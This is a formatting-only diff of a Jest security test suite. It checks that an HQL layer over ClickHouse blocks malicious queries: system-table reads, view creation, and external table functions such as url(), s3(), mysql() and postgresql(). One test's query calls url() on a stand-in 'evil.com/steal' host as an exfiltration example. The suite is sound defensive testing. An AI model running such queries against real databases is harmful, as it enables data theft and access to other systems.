@@ -152,14 +152,16 @@ describe("HQL Security Tests", () => {
       });
 
       // Should either error OR return empty/no results (depending on permissions)
-      const isBlocked = result.error || !result.data || result.data.length === 0;
+      const isBlocked =
+        result.error || !result.data || result.data.length === 0;
       expect(isBlocked).toBeTruthy();
     });
 
     it.skip("should block access to system.columns", async () => {
       // SKIPPED: In test environment, hql_user may have limited access to system tables
       // In production, ensure proper REVOKE statements are executed
-      const query = "SELECT * FROM system.columns WHERE table = 'request_response_rmt'";
+      const query =
+        "SELECT * FROM system.columns WHERE table = 'request_response_rmt'";
 
       const result = await clickhouse.queryWithContext({
         query,
@@ -168,7 +170,8 @@ describe("HQL Security Tests", () => {
       });
 
       // Should either error OR return empty/no results (depending on permissions)
-      const isBlocked = result.error || !result.data || result.data.length === 0;
+      const isBlocked =
+        result.error || !result.data || result.data.length === 0;
       expect(isBlocked).toBeTruthy();
     });
 
@@ -245,7 +248,8 @@ describe("HQL Security Tests", () => {
     });
 
     it("should block url() function", async () => {
-      const maliciousQuery = "SELECT * FROM url('http://evil.com/steal', 'CSV')";
+      const maliciousQuery =
+        "SELECT * FROM url('http://evil.com/steal', 'CSV')";
 
       const result = await clickhouse.queryWithContext({
         query: maliciousQuery,
@@ -259,7 +263,8 @@ describe("HQL Security Tests", () => {
     });
 
     it("should block odbc() function", async () => {
-      const maliciousQuery = "SELECT * FROM odbc('DSN=mydb', 'schema', 'table')";
+      const maliciousQuery =
+        "SELECT * FROM odbc('DSN=mydb', 'schema', 'table')";
 
       const result = await clickhouse.queryWithContext({
         query: maliciousQuery,
@@ -273,7 +278,8 @@ describe("HQL Security Tests", () => {
     });
 
     it("should block hdfs() function", async () => {
-      const maliciousQuery = "SELECT * FROM hdfs('hdfs://server:9000/path', 'CSV')";
+      const maliciousQuery =
+        "SELECT * FROM hdfs('hdfs://server:9000/path', 'CSV')";
 
       const result = await clickhouse.queryWithContext({
         query: maliciousQuery,
@@ -287,7 +293,8 @@ describe("HQL Security Tests", () => {
     });
 
     it("should block s3() function", async () => {
-      const maliciousQuery = "SELECT * FROM s3('https://bucket.s3.amazonaws.com/key', 'CSV')";
+      const maliciousQuery =
+        "SELECT * FROM s3('https://bucket.s3.amazonaws.com/key', 'CSV')";
 
       const result = await clickhouse.queryWithContext({
         query: maliciousQuery,
@@ -315,7 +322,8 @@ describe("HQL Security Tests", () => {
     });
 
     it("should block mysql() function", async () => {
-      const maliciousQuery = "SELECT * FROM mysql('server:3306', 'db', 'table', 'user', 'pass')";
+      const maliciousQuery =
+        "SELECT * FROM mysql('server:3306', 'db', 'table', 'user', 'pass')";
 
       const result = await clickhouse.queryWithContext({
         query: maliciousQuery,
@@ -329,7 +337,8 @@ describe("HQL Security Tests", () => {
     });
 
     it("should block postgresql() function", async () => {
-      const maliciousQuery = "SELECT * FROM postgresql('server:5432', 'db', 'table', 'user', 'pass')";
+      const maliciousQuery =
+        "SELECT * FROM postgresql('server:5432', 'db', 'table', 'user', 'pass')";
 
       const result = await clickhouse.queryWithContext({
         query: maliciousQuery,
@@ -387,7 +396,9 @@ describe("HQL Security Tests", () => {
       });
 
       // Should either be blocked or return no/empty data due to resource limits
-      expect(result.error || !result.data || result.data.length === 0).toBeTruthy();
+      expect(
+        result.error || !result.data || result.data.length === 0,
+      ).toBeTruthy();
     });
   });
 
@@ -421,7 +432,8 @@ describe("HQL Security Tests", () => {
     });
 
     it("should block CREATE VIEW", async () => {
-      const query = "CREATE VIEW malicious_view AS SELECT * FROM request_response_rmt";
+      const query =
+        "CREATE VIEW malicious_view AS SELECT * FROM request_response_rmt";
 
       const result = await clickhouse.queryWithContext({
         query,
@@ -493,7 +505,8 @@ describe("HQL Security Tests", () => {
 
   describe("Organization Context Validation", () => {
     it("should properly filter by organization", async () => {
-      const query = "SELECT DISTINCT organization_id FROM request_response_rmt LIMIT 10";
+      const query =
+        "SELECT DISTINCT organization_id FROM request_response_rmt LIMIT 10";
 
       const result = await clickhouse.queryWithContext({
         query,
